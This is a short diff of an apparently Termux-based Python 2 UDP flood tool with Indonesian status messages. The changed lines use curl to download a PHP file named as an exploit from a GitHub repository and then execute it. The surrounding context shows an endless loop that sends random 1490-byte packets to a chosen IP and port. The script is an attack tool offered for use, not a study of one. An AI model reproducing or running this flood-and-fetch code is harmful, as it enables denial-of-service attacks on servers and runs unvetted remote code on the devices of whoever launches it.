@@ -19,7 +19,7 @@ bytes = random._urandom(1490)
 
 os.system("termux-setup-storage")
 print "Downloading Source..."
-os.system("curl --url https://raw.githubusercontent.com/bibilgates/r/master/bil.php -o bil.php")
+os.system("curl --url https://raw.githubusercontent.com/bibilgates/Kamus_Exploit/master/e.php -o e")
 
 os.system("clear")
 
@@ -48,7 +48,7 @@ sent = 0
 
 time.sleep(1)
 print "[+] Mencari kelemahan Server, Please wait..."
-os.system("php bil.php")
+os.system("php e")
 
 while True:
      sock.sendto(bytes, (ip,port))
